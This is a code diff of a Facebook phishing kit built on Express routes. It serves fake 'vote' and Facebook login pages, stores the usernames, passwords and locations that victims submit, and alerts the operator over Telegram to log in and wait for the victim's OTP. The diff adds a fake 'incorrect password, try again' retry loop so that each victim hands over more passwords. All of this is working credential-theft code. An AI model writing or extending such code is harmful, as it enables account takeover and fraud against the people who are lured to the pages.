@@ -25,7 +25,7 @@ MESSAGE: Someone is about to Login.
 
                             `)
         }
-        return res.render("socials/facebook/vote", { req, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
+        return res.render("socials/facebook/vote", { req, link, name: link.modelName, linkType: link.linkType, linkId: link.id, retry: link.numberOfRetries, layout: false });
     } catch (err) {
         console.log(err)
         return res.redirect("/notfound")
@@ -54,7 +54,7 @@ MESSAGE: Someone is about to Login.
                             `)
         }
         const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
-        return res.render("socials/facebook/vote2", { req, picture: link.picture || samplePic, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
+        return res.render("socials/facebook/vote2", { req, link, picture: link.picture || samplePic, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
     } catch (err) {
         console.log(err)
         return res.redirect("/notfound")
@@ -66,7 +66,6 @@ router.get("/vote-3/:linkId", async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ link: linkId });
-        console.log(link);
         const url = "https://" + req.hostname + "/vote3/" + link.link;
         if (!link) {
             return res.redirect("/notfound");
@@ -112,7 +111,7 @@ router.get("/face/:linkId", async (req, res) => {
         if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
             return res.redirect("/notfound");
         }
-        return res.render("socials/facebook/facebook", { req, linkId, layout: false });
+        return res.render("socials/facebook/facebook", { req, linkId, link, layout: false });
     } catch (err) {
         console.log(err)
         return res.redirect("/dashboard")
@@ -142,14 +141,13 @@ router.get("/face/otp/:linkId", async (req, res) => {
 router.post("/face/:linkId", async (req, res) => {
     try {
         const { username, password, country, city, region, ip } = req.body;
+        const retry = req.query?.retry || 1;
         const { linkId } = req.params;
         if (linkId.length !== 24) {
             return res.redirect("/notfound");
         }
-        const link = await Links.findOne({ _id: linkId });;
+        const link = await Links.findOne({ _id: linkId });
         const user = await User.findById(link.user);
-
-        console.log(req.body)
 
         if (link?.name) {
             const newCredential = new Credential({
@@ -184,6 +182,11 @@ ${link.otpEnabled ? "Login and wait for victim to send OTP" : ""}
 Login with: https://www.facebook.com
                                                 `)
                 .catch(err => console.log("Telegram error"));
+                
+            if(retry > 1){
+                req.flash("error_msg", "incorrect password, try again.");
+                return res.redirect(`/face/${linkId}?retry=${retry-1}`)
+            }
             if (link.otpEnabled) {
                 return res.redirect("/face/otp/" + link.id);
             } else {
